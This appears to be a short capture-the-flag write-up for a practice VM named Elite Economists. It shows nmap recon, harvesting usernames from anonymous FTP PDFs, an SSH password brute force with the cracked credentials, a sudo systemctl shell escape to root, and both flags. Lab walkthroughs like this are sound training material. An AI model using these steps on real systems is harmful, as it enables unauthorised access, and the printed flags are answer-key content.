target-IP = 192.168.150.169
# recon 
```sh 
nmap 
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.150.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9fedc77b8fce64ccf1529a7e721a262 (RSA)
|   256 be6601fbd58568c72594b900f9cd4101 (ECDSA)
|_  256 18b4744ff23cb3131a2413465cfa4072 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home - Elite Economists
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


- ftp anonymous and get the pdfs in it 
- use exiftool to get authors 
- used author usernames from the pdfs 
- and generated a wordlist from the site 
- ```cewl -d 3 -m 4 http://192.168.150.169 ```
- then ssh brute-force 
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1332 login tries (l:4/p:333), ~84 tries per task
[DATA] attacking ssh://192.168.150.169:22/
[STATUS] 161.00 tries/min, 161 tries in 00:01h, 1172 to do in 00:08h, 16 active
[22][ssh] host: 192.168.150.169   login: joseph   password: wealthiest
```

- login 
- first user flag ```HMV{37q3p33CsMJgJQbrbYZMUFfTu}```
# privesc 

- run sudo -l 
- systemctl status 
- then !/bin/bash in the status 
- then root flag ```HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}```